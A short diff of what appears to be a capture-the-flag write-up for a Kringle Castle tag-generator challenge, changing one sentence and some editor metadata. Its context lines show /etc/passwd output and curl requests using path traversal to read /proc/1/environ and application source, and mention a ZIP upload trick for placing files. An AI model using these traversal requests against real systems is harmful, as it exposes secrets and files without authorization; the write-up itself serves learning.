@@ -15,7 +15,7 @@ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 [...]
 ```
-Using this the value of the environment variable can be obtained like this:
+Using this the value the environment variable can be obtained like this:
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../../proc/1/environ --output -
 
@@ -29,6 +29,6 @@ curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app
 ```
 This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLDkyMD
-Q1NTg2NSwtMTYwNjA3ODA0MF19
+eyJoaXN0b3J5IjpbLTY1OTUwNDczOSwtMjQzOTQyODY2LDEzMT
+IwNTY0NTMsOTIwNDU1ODY1LC0xNjA2MDc4MDQwXX0=
 -->
